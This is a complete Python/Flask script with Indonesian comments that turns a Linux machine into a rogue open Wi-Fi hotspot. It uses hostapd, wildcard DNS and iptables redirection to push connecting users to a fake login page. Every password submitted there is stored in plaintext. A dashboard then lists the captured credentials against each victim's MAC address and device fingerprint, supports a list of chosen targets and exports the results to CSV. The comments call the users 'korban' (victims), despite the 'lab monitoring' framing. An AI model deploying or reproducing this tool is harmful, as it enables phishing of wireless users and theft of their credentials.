#!/usr/bin/env python3
import os, sys, json, time, random, hashlib, sqlite3, argparse, subprocess, csv
from io import StringIO
from datetime import datetime, timezone, timedelta
from flask import Flask, request, redirect, render_template, render_template_string, jsonify, url_for, session, make_response

SSID = "Free_WiFi_Hotspot"
INTERFACE = "wlan0"
PORTAL_IP = "192.168.44.1"
DHCP_RANGE = "192.168.44.10,192.168.44.250,12h"
DB_PATH = "clients.db"
CHANNEL = 6

app = Flask(__name__)
app.secret_key = 'super_secret_key_untuk_session_login'

def get_wib_time():
    wib = timezone(timedelta(hours=7))
    return datetime.now(wib).strftime('%Y-%m-%d %H:%M:%S')

# ==========================================
# DATABASE SETUP
# ==========================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT, mac TEXT, ip TEXT, hostname TEXT DEFAULT 'Unknown',
        user_agent TEXT DEFAULT '', os_fingerprint TEXT DEFAULT '', device_type TEXT DEFAULT '',
        first_seen TIMESTAMP, last_seen TIMESTAMP,
        portal_visited INTEGER DEFAULT 0, credentials_entered INTEGER DEFAULT 0, score INTEGER DEFAULT 100,
        browser TEXT DEFAULT 'Unknown', mac_type TEXT DEFAULT 'Unknown',
        UNIQUE(mac, ip)
    )''')
    
    try: c.execute("ALTER TABLE clients ADD COLUMN browser TEXT DEFAULT 'Unknown'")
    except: pass
    try: c.execute("ALTER TABLE clients ADD COLUMN mac_type TEXT DEFAULT 'Unknown'")
    except: pass

    c.execute('''CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id INTEGER, timestamp TIMESTAMP,
        username TEXT, password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (
        id INTEGER PRIMARY KEY AUTOINCREMENT, mac TEXT UNIQUE, name TEXT, notes TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT DEFAULT 'user'
    )''')
    
    c.execute("SELECT COUNT(*) FROM admin_users")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO admin_users (username, password, role) VALUES ('admin', 'admin123', 'superadmin')")
    
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ==========================================
# FINGERPRINTING
# ==========================================
def fingerprint_ua(ua):
    ua_lower = ua.lower()
    os_fp = "Unknown OS"
    dev_type = "Unknown Device"

    if not ua: return os_fp, dev_type

    if "iphone" in ua_lower:
        os_fp = "iOS"
        dev_type = "HP (Smartphone)"
    elif "ipad" in ua_lower:
        os_fp = "iOS"
        dev_type = "Tablet"
    elif "android" in ua_lower:
        os_fp = "Android"
        dev_type = "Tablet" if "tablet" in ua_lower or "sm-t" in ua_lower else "HP (Smartphone)"
    elif "windows" in ua_lower:
        os_fp = "Windows"
        dev_type = "Laptop / PC"
    elif "macintosh" in ua_lower or "mac os" in ua_lower:
        os_fp = "macOS"
        dev_type = "Laptop / PC"
    elif "cros" in ua_lower:
        os_fp = "Chrome OS"
        dev_type = "Laptop / PC"
    elif "linux" in ua_lower:
        os_fp = "Linux"
        dev_type = "Laptop / PC"

    return os_fp, dev_type

def get_browser(ua):
    ua_lower = ua.lower()
    if not ua: return "Unknown"
    if 'edg/' in ua_lower or 'edge/' in ua_lower: return "Microsoft Edge"
    if 'chrome/' in ua_lower and 'crios' not in ua_lower: return "Google Chrome"
    if 'crios/' in ua_lower: return "Chrome (iOS)"
    if 'safari/' in ua_lower and 'chrome' not in ua_lower: return "Apple Safari"
    if 'firefox/' in ua_lower or 'fxios/' in ua_lower: return "Mozilla Firefox"
    if 'opera/' in ua_lower or 'opr/' in ua_lower: return "Opera"
    return "Webview / CNA"

def check_mac_type(mac):
    if len(mac) > 1 and mac[1].upper() in ['2', '6', 'A', 'E']:
        return "🔒 Acak (Privasi)"
    return "🔌 Fisik (Pabrik)"

def get_hostname_from_leases(mac):
    try:
        with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 4 and parts[1].upper() == mac.upper():
                    if parts[3] != '*': return parts[3]
    except: pass
    return 'Unknown Device'

def get_mac_from_arp(ip):
    try:
        out = subprocess.check_output(['arp', '-n', ip], stderr=subprocess.DEVNULL).decode()
        for line in out.split('\n'):
            if ip in line:
                for p in line.split():
                    if ':' in p and len(p) == 17: return p.upper()
    except: pass
    return "XX:XX:XX:XX:XX:XX"

def register_client(ip):
    ua = request.headers.get('User-Agent', '')
    os_fp, dev_type = fingerprint_ua(ua)
    browser = get_browser(ua)
    mac = get_mac_from_arp(ip)
    mac_type = check_mac_type(mac)
    hostname = get_hostname_from_leases(mac)
    wib_time = get_wib_time()

    conn = get_db()
    existing = conn.execute('SELECT * FROM clients WHERE mac = ? AND ip = ?', (mac, ip)).fetchone()
    
    if existing:
        new_os = os_fp if os_fp != "Unknown OS" else existing['os_fingerprint']
        new_dev = dev_type if dev_type != "Unknown Device" else existing['device_type']
        
        if existing['device_type'] == "HP (Smartphone)" and new_dev == "Laptop / PC":
            new_dev = "HP (Smartphone)"
            new_os = existing['os_fingerprint']
            
        new_browser = browser if browser not in ["Webview / CNA", "Unknown"] else existing['browser']
        new_host = hostname if hostname != "Unknown Device" else existing['hostname']
        new_ua = ua if ua else existing['user_agent']

        conn.execute('''UPDATE clients SET 
                     last_seen = ?, user_agent = ?, os_fingerprint = ?, 
                     device_type = ?, hostname = ?, browser = ?, mac_type = ? WHERE id = ?''', 
                     (wib_time, new_ua, new_os, new_dev, new_host, new_browser, mac_type, existing['id']))
        client_id = existing['id']
    else:
        # User pertama kali masuk, skor dimulai dari 100 (Hijau)
        c = conn.execute('''INSERT INTO clients 
                         (mac, ip, user_agent, os_fingerprint, device_type, hostname, browser, mac_type, score, first_seen, last_seen) 
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, 100, ?, ?)''', 
                         (mac, ip, ua, os_fp, dev_type, hostname, browser, mac_type, wib_time, wib_time))
        client_id = c.lastrowid
        
    conn.commit()
    conn.close()
    return client_id

# ==========================================
# ROUTE CAPTIVE PORTAL (USER/KORBAN)
# ==========================================
@app.before_request
def capture_all():
    ip = request.remote_addr
    if any(request.path.startswith(s) for s in ('/static', '/admin', '/favicon')): return
    register_client(ip)

@app.route('/')
@app.route('/hotspot-detect.html')
@app.route('/generate_204')
@app.route('/redirect')
def portal_redirect():
    client_id = register_client(request.remote_addr)
    conn = get_db()
    # Mengurangi skor jadi 60 (Kuning) karena korban berani membuka halaman portal
    conn.execute('UPDATE clients SET portal_visited = 1, score = CASE WHEN score > 60 THEN 60 ELSE score END WHERE id = ?', (client_id,))
    conn.commit()
    conn.close()
    return redirect(url_for('login_page'))

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        client_id = register_client(request.remote_addr)
        user = request.form.get('username', '')
        pw = request.form.get('password', '')
        wib_time = get_wib_time()
        
        conn = get_db()
        conn.execute('INSERT INTO credentials (client_id, username, password, timestamp) VALUES (?, ?, ?, ?)', (client_id, user, pw, wib_time))
        # Mengurangi skor jadi 0 (Merah) karena korban memasukkan password
        conn.execute('UPDATE clients SET credentials_entered = 1, score = 0 WHERE id = ?', (client_id,))
        conn.commit()
        conn.close()
        
        return """
        <script>
            alert('PERINGATAN: Sesi Anda terpantau oleh sistem keamanan jaringan. Klik OK untuk melanjutkan.');
            window.location.href='/connected';
        </script>
        """
    return render_template('login.html', ssid=SSID)

@app.route('/connected')
def connected_page():
    return render_template('konek.html', ssid=SSID)

@app.route('/<path:path>')
def catch_all(path):
    if path.startswith(('admin', 'static')): return '', 404
    return redirect(url_for('login_page'))

# ==========================================
# ROUTE ADMIN MONITORING (DASHBOARD)
# ==========================================
def login_required(f):
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session: return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        user = request.form.get('username')
        pw = request.form.get('password')
        conn = get_db()
        admin = conn.execute('SELECT * FROM admin_users WHERE username = ? AND password = ?', (user, pw)).fetchone()
        conn.close()
        if admin:
            session['admin_logged_in'] = True
            session['admin_user'] = admin['username']
            return redirect(url_for('admin_dashboard'))
        else:
            return "<script>alert('Login Gagal! Cek username/password.'); window.history.back();</script>"
            
    return """
    <body style="font-family:sans-serif; background:#1e1e1e; color:white; display:flex; justify-content:center; align-items:center; height:100vh;">
    <form method="POST" style="background:#2a2a2a; padding:40px; border-radius:10px; width:320px; text-align:center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
        <h2 style="margin-bottom: 25px;">Admin Login</h2>
        <input type="text" name="username" placeholder="Username" required style="width:100%; padding:12px; margin-bottom:15px; border-radius:5px; border:none;">
        <input type="password" name="password" placeholder="Password" required style="width:100%; padding:12px; margin-bottom:20px; border-radius:5px; border:none;">
        <button type="submit" style="width:100%; padding:12px; background:#007bff; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">Login Dashboard</button>
    </form></body>
    """

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin')
@login_required
def admin_dashboard():
    conn = get_db()
    total_users = conn.execute('SELECT COUNT(*) FROM clients').fetchone()[0]
    total_creds = conn.execute('SELECT COUNT(*) FROM credentials').fetchone()[0]
    
    # Mengurutkan dari yang paling MERAH (Skor Terendah) ke atas
    clients = conn.execute('''
        SELECT c.*, t.name as target_name, 
        (SELECT username || ' | ' || password FROM credentials cr WHERE cr.client_id = c.id ORDER BY id DESC LIMIT 1) as caught_creds
        FROM clients c LEFT JOIN targets t ON c.mac = t.mac
        ORDER BY c.score ASC, c.last_seen DESC
    ''').fetchall()
    
    admins = conn.execute('SELECT * FROM admin_users').fetchall()
    conn.close()

    html = """
    <!DOCTYPE html>
    <html><head><title>Dashboard Keamanan Wi-Fi</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>body{background:#f4f7f6;} .card{box-shadow: 0 4px 8px rgba(0,0,0,0.05); border:none;} th{font-size: 13px;} td{font-size: 14px; vertical-align: middle;}</style>
    </head><body>
    <nav class="navbar navbar-dark bg-dark mb-4 shadow">
      <div class="container-fluid">
        <span class="navbar-brand mb-0 h1">🛡️ Lab Monitoring : {{ssid}}</span>
        <div><span class="text-light me-3">Halo, {{ session['admin_user'] }}</span> <a href="/admin/logout" class="btn btn-sm btn-danger">Logout</a></div>
      </div>
    </nav>
    <div class="container-fluid px-4">
        <div class="row mb-4">
            <div class="col-md-3">
                <div class="card text-white bg-primary p-3 shadow-sm">
                    <h6>Total Akses SSID</h6><h3>{{ total_users }} Device</h3>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card text-white bg-danger p-3 shadow-sm">
                    <h6>Kredensial Tertangkap</h6><h3>{{ total_creds }} Data</h3>
                </div>
            </div>
            <div class="col-md-6 text-end">
                <a href="/admin/export" class="btn btn-success mt-3 shadow-sm">⬇️ Download Report (CSV)</a>
                <button class="btn btn-warning mt-3 shadow-sm" data-bs-toggle="modal" data-bs-target="#uploadModal">⬆️ Upload Target (CSV)</button>
                <button class="btn btn-secondary mt-3 shadow-sm" data-bs-toggle="modal" data-bs-target="#userModal">👥 Kelola Admin</button>
            </div>
        </div>

        <div class="card p-4 mb-4 shadow-sm">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h5 class="m-0">Laporan Keamanan Klien Real-Time (WIB)</h5>
                <div>
                    <a href="/admin" class="btn btn-sm btn-info text-white me-2">🔄 Refresh Data</a>
                    <a href="/admin/reset" class="btn btn-sm btn-outline-danger" onclick="return confirm('Hapus semua log secara permanen?');">🗑️ Reset Log</a>
                </div>
            </div>
            <div class="table-responsive">
            <table class="table table-striped table-hover mt-2" id="clientTable">
                <thead class="table-dark">
                    <tr><th>Target / MAC</th><th>IP & Hostname</th><th>Device / OS</th><th>Tipe MAC & Browser</th><th>Terakhir Dilihat (WIB)</th><th>Skor Keamanan</th><th>Kredensial (User | Pass)</th></tr>
                </thead>
                <tbody>
                    {% for c in clients %}
                    <tr>
                        <td>
                            {% if c.target_name %}<span class="badge bg-danger mb-1">TARGET: {{c.target_name}}</span><br>{% endif %}
                            <strong>{{ c.mac }}</strong>
                        </td>
                        <td><span class="text-primary fw-bold">{{ c.ip }}</span><br><small class="text-muted">{{ c.hostname }}</small></td>
                        <td><strong>{{ c.device_type }}</strong><br><small>{{ c.os_fingerprint }}</small></td>
                        <td><span class="badge bg-secondary">{{ c.mac_type }}</span><br><small class="text-info fw-bold">{{ c.browser }}</small></td>
                        <td><small>{{ c.last_seen }}</small></td>
                        <td>
                            {% if c.score >= 80 %}
                                <span class="badge bg-success" style="font-size: 13px;">{{ c.score }} (Waspada)</span><br><small class="text-success fw-bold">Hanya Konek</small>
                            {% elif c.score >= 50 %}
                                <span class="badge bg-warning text-dark" style="font-size: 13px;">{{ c.score }} (Rentan)</span><br><small class="text-warning fw-bold">Membuka Portal</small>
                            {% else %}
                                <span class="badge bg-danger" style="font-size: 13px;">{{ c.score }} (Berbahaya)</span><br><small class="text-danger fw-bold">Kredensial Bocor</small>
                            {% endif %}
                        </td>
                        <td class="text-danger fw-bold">{{ c.caught_creds if c.caught_creds else '-' }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
            </div>
        </div>
    </div>

    <!-- Modals -->
    <div class="modal fade" id="userModal"><div class="modal-dialog"><div class="modal-content"><form action="/admin/add_user" method="POST"><div class="modal-header"><h5>Kelola Akun Monitoring</h5></div><div class="modal-body"><h6>Tambah User Biasa (Viewer)</h6><input type="text" name="username" class="form-control mb-2" placeholder="Username Baru" required><input type="password" name="password" class="form-control mb-2" placeholder="Password Baru" required><hr><h6>Daftar User Saat Ini:</h6><ul>{% for a in admins %} <li>{{ a.username }}</li> {% endfor %}</ul></div><div class="modal-footer"><button type="submit" class="btn btn-primary">Tambah User</button></div></form></div></div></div>
    <div class="modal fade" id="uploadModal"><div class="modal-dialog"><div class="modal-content"><form action="/admin/upload" method="POST" enctype="multipart/form-data"><div class="modal-header"><h5>Upload Target (Format CSV)</h5></div><div class="modal-body"><p class="text-muted small">Upload file CSV dengan format Header: <code>mac,name,notes</code></p><input type="file" name="file" class="form-control mb-2" accept=".csv" required></div><div class="modal-footer"><button type="submit" class="btn btn-warning">Upload Data</button></div></form></div></div></div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    </body></html>
    """
    return render_template_string(html, ssid=SSID, total_users=total_users, total_creds=total_creds, clients=clients, admins=admins, session=session)

# ==========================================
# EXPORT / UPLOAD / ADD USER ROUTE
# ==========================================
@app.route('/admin/add_user', methods=['POST'])
@login_required
def add_admin_user():
    u = request.form.get('username')
    p = request.form.get('password')
    conn = get_db()
    try: conn.execute('INSERT INTO admin_users (username, password, role) VALUES (?, ?, ?)', (u, p, 'user')); conn.commit()
    except: pass
    conn.close()
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/export')
@login_required
def export_csv():
    conn = get_db()
    # Export diurutkan dari skor terkecil (Merah) ke hijau
    clients = conn.execute('''
        SELECT c.mac, c.mac_type, c.ip, c.hostname, c.device_type, c.os_fingerprint, c.browser, c.score, c.last_seen,
        COALESCE((SELECT username || ' : ' || password FROM credentials cr WHERE cr.client_id = c.id LIMIT 1), 'Tidak Ada') as creds
        FROM clients c ORDER BY c.score ASC
    ''').fetchall()
    conn.close()

    si = StringIO()
    cw = csv.writer(si)
    cw.writerow(['MAC Address', 'Tipe MAC', 'IP Address', 'Hostname', 'Device', 'OS', 'Browser', 'Skor Keamanan', 'Terakhir Dilihat (WIB)', 'Kredensial Disubmit'])
    for c in clients:
        cw.writerow([c['mac'], c['mac_type'], c['ip'], c['hostname'], c['device_type'], c['os_fingerprint'], c['browser'], c['score'], c['last_seen'], c['creds']])
    
    output = make_response(si.getvalue())
    output.headers["Content-Disposition"] = "attachment; filename=Report_Cyber_Keamanan.csv"
    output.headers["Content-type"] = "text/csv"
    return output

@app.route('/admin/upload', methods=['POST'])
@login_required
def upload_csv():
    file = request.files.get('file')
    if file and file.filename.endswith('.csv'):
        stream = StringIO(file.stream.read().decode("UTF8"), newline=None)
        csv_input = csv.reader(stream)
        conn = get_db()
        next(csv_input, None)
        for row in csv_input:
            if len(row) >= 2:
                mac, name = row[0].upper().strip(), row[1].strip()
                try: conn.execute('INSERT OR REPLACE INTO targets (mac, name) VALUES (?, ?)', (mac, name))
                except: pass
        conn.commit()
        conn.close()
        return "<script>alert('Data target berhasil diupload!'); window.location.href='/admin';</script>"
    return "<script>alert('File tidak valid. Pastikan formatnya .csv'); window.location.href='/admin';</script>"

@app.route('/admin/reset')
@login_required
def reset_database():
    conn = get_db()
    conn.execute('DROP TABLE IF EXISTS credentials')
    conn.execute('DROP TABLE IF EXISTS clients')
    conn.commit()
    conn.close()
    init_db()  
    return redirect(url_for('admin_dashboard'))

# ==========================================
# SETUP JARINGAN
# ==========================================
def force_cleanup(interface, port):
    subprocess.run(['systemctl', 'stop', 'NetworkManager'], stderr=subprocess.DEVNULL)
    subprocess.run(['killall', '-9', 'wpa_supplicant', 'hostapd', 'dnsmasq'], stderr=subprocess.DEVNULL)
    subprocess.run(['fuser', '-k', f'{port}/tcp'], stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'addr', 'flush', 'dev', interface], stderr=subprocess.DEVNULL)

def setup_ap(interface, port):
    force_cleanup(interface, port)
    with open('/tmp/hostapd.conf', 'w') as f:
        f.write(f"interface={interface}\ndriver=nl80211\nssid={SSID}\nhw_mode=g\nchannel={CHANNEL}\nwmm_enabled=0\n")
    with open('/tmp/dnsmasq.conf', 'w') as f:
        f.write(f"interface={interface}\ndhcp-range={DHCP_RANGE}\naddress=/#/{PORTAL_IP}\n")

    subprocess.run(['ip', 'addr', 'add', f'{PORTAL_IP}/24', 'dev', interface], check=True)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
    subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', interface, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', f'{PORTAL_IP}:{port}'], check=True)

    subprocess.Popen(['hostapd', '/tmp/hostapd.conf'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    subprocess.Popen(['dnsmasq', '-C', '/tmp/dnsmasq.conf', '--no-daemon'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    print(f"\n[+] Akses Dashboard Admin di: http://{PORTAL_IP}:{port}/admin")
    print(f"    Username: admin | Password: admin123\n")

def cleanup_ap(interface):
    subprocess.run(['killall', 'hostapd', 'dnsmasq'], stderr=subprocess.DEVNULL)
    subprocess.run(['iptables', '-t', 'nat', '-F'], stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'addr', 'flush', 'dev', interface], stderr=subprocess.DEVNULL)
    subprocess.run(['systemctl', 'start', 'NetworkManager'], stderr=subprocess.DEVNULL)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--interface', '-i', default='wlan0')
    parser.add_argument('--port', '-p', type=int, default=8080)
    parser.add_argument('--ssid', default=SSID)
    args = parser.parse_args()
    
    SSID = args.ssid
    init_db()
    setup_ap(args.interface, args.port)
    
    try:
        app.run(host='0.0.0.0', port=args.port, debug=False)
    except KeyboardInterrupt:
        cleanup_ap(args.interface)
        print("\n[*] Jaringan dikembalikan normal.")
